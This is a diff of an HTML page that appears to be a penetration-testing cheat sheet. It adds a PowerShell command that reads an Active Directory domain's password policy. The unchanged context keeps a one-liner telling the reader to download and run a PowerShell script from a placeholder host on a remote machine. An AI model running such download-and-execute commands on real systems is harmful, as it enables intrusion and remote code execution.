@@ -632,6 +632,10 @@ You need to add the following line at the end:</p>
 <p>On the remote host, execute the following PowerShell script:</p>
 <pre><code class="language-powershell line-numbers">IEX(New-Object System.Net.WebClient).DownloadString('http://&lt;ip&gt;:&lt;port&gt;/&lt;script_name.ps1&gt;')
 </code></pre>
+
+<h3 id="get-domain-password-policy">Get Domain Password Policy</h3>
+<pre><code class="language-powershell line-numbers">$policy = Get-ADDefaultDomainPasswordPolicy -Credential $cred -Server $domain
+</code></pre>
             
           </div>
           <footer>
